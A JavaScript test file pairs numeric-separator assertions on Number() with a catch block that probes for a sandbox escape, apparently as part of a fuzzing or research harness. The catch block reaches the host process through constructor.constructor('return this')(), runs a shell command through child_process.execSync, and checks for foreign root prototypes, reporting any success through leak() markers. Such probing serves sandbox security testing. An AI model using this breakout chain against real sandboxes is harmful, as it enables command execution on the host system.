try {
    assert.sameValue(Number('+123456789_0'), NaN, '+123456789_0');
    assert.sameValue(Number('+123456789_1'), NaN, '+123456789_1');
    assert.sameValue(Number('+123456789_2'), NaN, '+123456789_2');
    assert.sameValue(Number('+123456789_3'), NaN, '+123456789_3');
    assert.sameValue(Number('+123456789_4'), NaN, '+123456789_4');
    assert.sameValue(Number('+123456789_5'), NaN, '+123456789_5');
    assert.sameValue(Number('+123456789_6'), NaN, '+123456789_6');
    assert.sameValue(Number('+123456789_7'), NaN, '+123456789_7');
    assert.sameValue(Number('+123456789_8'), NaN, '+123456789_8');
    assert.sameValue(Number('+123456789_9'), NaN, '+123456789_9');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}